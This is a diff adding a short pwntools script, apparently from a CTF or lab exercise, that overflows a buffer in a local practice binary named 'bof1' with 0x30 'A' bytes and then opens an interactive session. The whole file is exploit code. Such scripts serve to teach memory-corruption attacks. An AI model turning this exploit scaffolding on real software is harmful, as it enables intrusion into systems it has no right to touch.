@@ -1,0 +1,10 @@
+from pwn import *
+
+p = process("./bof1")
+e = ELF("./bof1")
+
+payload = b'A' * 0x30
+
+p.sendafter("> ", payload)
+p.interactive()
+
